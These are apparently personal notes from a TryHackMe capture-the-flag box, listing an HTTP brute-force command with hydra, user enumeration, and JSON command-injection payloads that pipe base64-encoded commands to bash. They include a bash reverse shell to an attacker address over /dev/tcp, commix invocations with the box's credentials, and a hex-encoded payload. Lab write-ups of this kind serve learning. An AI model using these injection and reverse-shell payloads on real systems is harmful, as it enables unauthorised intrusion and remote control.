No CVE. Not vulnerable services. Only http and smb open. Need credentials to get authorized to webserver.
![unnamed_c071e0d077a5483da783ff3b14dc90f1](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011506.png)
Found likely username. Time to bruteforce
```
hydra -l fox -P /usr/share/wordlists/rockyou.txt 10.10.56.230 http-get  -V -e nsr -f -t 50 
```
![unnamed_d5a9e8615b66456d9c6061fe2d77bd20](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011506-1.png)
Found a new user
```
enum4linux -a IP was the only scan that found rascal. Not nmap, and not enum4linug-ng
```
![unnamed_5d67ff740a21482aa15760574b0ddd51](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011506-2.png)
![unnamed_54d5116b997a4dea8e2741d281c1a0fe](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011507.png)
```
{
"target":"\";echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \""
}
```
![unnamed_28bb3373078e49febf713e624fb8f46d](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011507-1.png)
![unnamed_8ac3a39d05a14b06acee1b047bb4bc02](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011507-2.png)
![unnamed_843196b92b074b53b037d6ad253734a5](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011507-3.png)
![unnamed_ed688a7c7e03441aaf799f1a76a37780](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011507-4.png)
pipe at the end also works, but only adding bash at the end will not cut it
also nice way to test
![unnamed_b2756175a45f4962b873b53c4386e477](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011507-5.png)
```
echo 'bash -i &>/dev/tcp/10.13.4.2/443 <&1' | base64
```
```
{"target":"\";echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEzLjQuMi80NDMgPCYxCg | base64 -d| bash;\""}
```
![unnamed_75b4f1f0fd854a67824b6c8ece8b4e29](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011507-6.png)
![unnamed_1ca9c6abc6ab4c61bc097f92a0f2e2f1](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/yotf/notes/{{notename}}-202605011507-7.png)
```
commix --url="<http://10.10.158.237/assets/php/search.php>" --cookie='Authorization: Basic cmFzY2FsOmNocm9ubw==' --method=POST --data='{"target":"test"}' --auth-cred="rascal:chrono" --auth-type=basic --batch --level=3


commix --url="<http://10.10.158.237/assets/php/search.php>" --cookie='Authorization: Basic cmFzY2FsOmNocm9ubw==' --method=POST --data='{"target":"test"}' --auth-cred="rascal:chrono" --auth-type=basic --os-cmd='ping -c 2 localhost'
```
```
{"target":"\";bash -i &>/dev/tcp/10.13.4.2/443 <&1; \""}
7b22746172676574223a225c223b62617368 2d69 263e2f6465762f7463702f31302e31332e342e322f343433 3c26313b 5c22227d
```